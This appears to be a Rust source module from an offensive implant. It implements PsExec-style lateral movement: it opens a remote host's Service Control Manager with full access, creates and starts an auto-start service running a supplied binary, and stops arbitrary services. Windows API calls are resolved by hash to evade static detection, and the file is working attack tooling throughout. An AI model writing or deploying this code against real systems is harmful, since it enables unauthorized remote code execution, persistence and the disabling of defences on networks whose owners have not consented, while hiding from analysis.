#[cfg(target_os = "windows")]
use alloc::vec::Vec;

#[cfg(target_os = "windows")]
use core::ffi::c_void;
#[cfg(target_os = "windows")]
use crate::utils::api_resolver::{hash_str, resolve_function};
#[cfg(target_os = "windows")]
use crate::utils::windows_definitions::*;

pub struct Lateral;

impl Lateral {
    pub fn psexec(&self, target: &str, service_name: &str, binary_path: &str) -> Result<(), ()> {
        #[cfg(target_os = "windows")]
        unsafe {
            let advapi32 = hash_str(b"advapi32.dll");
            let open_scm = resolve_function(advapi32, hash_str(b"OpenSCManagerA"));
            let create_service = resolve_function(advapi32, hash_str(b"CreateServiceA"));
            let start_service = resolve_function(advapi32, hash_str(b"StartServiceA"));
            let close_handle = resolve_function(advapi32, hash_str(b"CloseServiceHandle"));

            if open_scm.is_null() || create_service.is_null() { return Err(()); }

            type FnOpenSCManager = unsafe extern "system" fn(*const u8, *const u8, u32) -> HANDLE;
            type FnCreateService = unsafe extern "system" fn(HANDLE, *const u8, *const u8, u32, u32, u32, u32, *const u8, *const u8, *mut u32, *const u8, *const u8, *const u8) -> HANDLE;
            type FnStartService = unsafe extern "system" fn(HANDLE, u32, *const *const u8) -> i32;
            type FnCloseServiceHandle = unsafe extern "system" fn(HANDLE) -> i32;

            let mut target_c = Vec::from(target.as_bytes()); target_c.push(0);
            let scm = core::mem::transmute::<_, FnOpenSCManager>(open_scm)(
                target_c.as_ptr(),
                core::ptr::null(),
                0xF003F // SC_MANAGER_ALL_ACCESS
            );

            if scm.is_null() { return Err(()); }

            let mut name_c = Vec::from(service_name.as_bytes()); name_c.push(0);
            let mut bin_c = Vec::from(binary_path.as_bytes()); bin_c.push(0);

            let svc = core::mem::transmute::<_, FnCreateService>(create_service)(
                scm,
                name_c.as_ptr(),
                name_c.as_ptr(),
                0xF01FF, // SERVICE_ALL_ACCESS
                0x10,    // SERVICE_WIN32_OWN_PROCESS
                0x2,     // SERVICE_AUTO_START
                0x1,     // SERVICE_ERROR_NORMAL
                bin_c.as_ptr(),
                core::ptr::null(),
                core::ptr::null_mut(),
                core::ptr::null(),
                core::ptr::null(),
                core::ptr::null()
            );

            if !svc.is_null() {
                core::mem::transmute::<_, FnStartService>(start_service)(svc, 0, core::ptr::null());
                core::mem::transmute::<_, FnCloseServiceHandle>(close_handle)(svc);
            }

            core::mem::transmute::<_, FnCloseServiceHandle>(close_handle)(scm);
            Ok(())
        }
        #[cfg(not(target_os = "windows"))]
        { 
            let _ = target;
            let _ = service_name;
            let _ = binary_path;
            Err(()) 
        }
    }

    pub fn service_stop(&self, service_name: &str) -> Result<(), ()> {
        #[cfg(target_os = "windows")]
        unsafe {
            let advapi32 = hash_str(b"advapi32.dll");
            let open_scm = resolve_function(advapi32, hash_str(b"OpenSCManagerA"));
            let open_service = resolve_function(advapi32, hash_str(b"OpenServiceA"));
            let control_service = resolve_function(advapi32, hash_str(b"ControlService"));
            let close_handle = resolve_function(advapi32, hash_str(b"CloseServiceHandle"));

            if open_scm.is_null() || open_service.is_null() || control_service.is_null() || close_handle.is_null() { return Err(()); }
            
            type FnOpenSCManager = unsafe extern "system" fn(*const u8, *const u8, u32) -> HANDLE;
            type FnOpenService = unsafe extern "system" fn(HANDLE, *const u8, u32) -> HANDLE;
            type FnControlService = unsafe extern "system" fn(HANDLE, u32, *mut c_void) -> i32;
            type FnCloseServiceHandle = unsafe extern "system" fn(HANDLE) -> i32;

            let scm = core::mem::transmute::<_, FnOpenSCManager>(open_scm)(core::ptr::null(), core::ptr::null(), 0xF003F);
            if scm.is_null() { return Err(()); }

            let mut name_c = Vec::from(service_name.as_bytes()); name_c.push(0);
            let svc = core::mem::transmute::<_, FnOpenService>(open_service)(scm, name_c.as_ptr(), 0xF01FF);

            if !svc.is_null() {
                let mut status = [0u8; 36]; // SERVICE_STATUS
                core::mem::transmute::<_, FnControlService>(control_service)(svc, 0x1, status.as_mut_ptr() as *mut c_void); // STOP
                core::mem::transmute::<_, FnCloseServiceHandle>(close_handle)(svc);
            }
            core::mem::transmute::<_, FnCloseServiceHandle>(close_handle)(scm);
            Ok(())
        }
        #[cfg(not(target_os = "windows"))]
        { 
            let _ = service_name;
            Err(()) 
        }
    }
}
